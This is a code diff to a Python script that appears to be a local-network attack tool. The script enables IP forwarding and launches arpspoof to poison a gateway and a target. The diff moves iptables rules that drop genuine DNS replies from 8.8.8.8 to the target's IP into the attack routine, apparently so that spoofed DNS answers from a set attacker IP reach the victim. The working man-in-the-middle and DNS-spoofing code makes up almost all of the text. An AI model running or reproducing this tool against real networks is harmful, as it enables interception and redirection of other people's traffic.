@@ -5,20 +5,7 @@ import subprocess
 import os
 
 os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-commands = [
-    "iptables -A FORWARD -s 8.8.8.8 -p udp --sport 53 -d 192.168.0.4 -j DROP",
-    "iptables -A FORWARD -s 8.8.8.8 -p tcp --sport 53 -d 192.168.0.4 -j DROP"
-]
 
-# Run each command
-for cmd in commands:
-
-    try:
-        subprocess.run(cmd.split(), check=True)
-        print(f"Executed: {cmd}")
-    except subprocess.CalledProcessError as e:
-        print(f"Failed to run: {cmd}\nError: {e}")
-        
         
 attacker_ip = "192.168.0.254"
 upstream_dns = "8.8.8.8"
@@ -222,6 +209,22 @@ def main():
                     "gnome-terminal", "--", "bash", "-c",
                     f"arpspoof -i {Intface} -t {gateway_ip} {target_ip}; exec bash"
                 ])
+                
+                commands = [
+                    f"iptables -A FORWARD -s 8.8.8.8 -p udp --sport 53 -d {target_ip} -j DROP",
+                    f"iptables -A FORWARD -s 8.8.8.8 -p tcp --sport 53 -d {target_ip} -j DROP"
+                ]
+
+                # Run each command
+                for cmd in commands:
+
+                    try:
+                        subprocess.run(cmd.split(), check=True)
+                        print(f"Executed: {cmd}")
+                    except subprocess.CalledProcessError as e:
+                        print(f"Failed to run: {cmd}\nError: {e}")
+                        
+                
                 print(f"[!] ARP poison sent to {target_ip} ({target_mac}). Check subprocess output for details.") 
                
             else:
